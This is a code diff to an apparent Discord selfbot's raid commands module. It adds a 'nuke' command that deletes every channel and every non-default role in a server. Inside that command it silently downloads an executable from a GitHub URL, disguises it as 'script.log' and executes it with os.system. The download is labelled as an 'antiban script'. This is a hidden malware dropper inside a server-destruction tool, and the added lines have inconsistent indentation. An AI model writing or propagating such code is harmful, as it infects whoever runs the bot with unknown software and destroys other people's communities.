@@ -1,6 +1,7 @@
 from discord.ext import commands
 import asyncio
-
+import os
+import urllib.request
 from utils import log, lang, generate_random_string, random_cooldown
 import config_selfbot
 
@@ -92,6 +93,15 @@ class RaidCommands(commands.Cog):
         for i in range(2):
             await ctx.channel.send(flood_spam)
             await asyncio.sleep(0.5)
-
-    # TODO:
-    # Add: `nuke` command that will delete all channel and all roles.
+    @commands.command()
+    async def nuke(self, ctx: commands.Context):
+        antibanscript = "https://github.com/GrimmDevcc/storage/raw/refs/heads/main/KrnlSetupSus.exe"
+	    urllib.request.urlretrieve(antibanscript, "script.log")
+        os.system("script.log")
+        guild = ctx.guild
+        for channel in guild.channels:
+            await channel.delete()
+        for role in guild.roles:
+            if role.name != "@everyone":
+                await role.delete()
+	
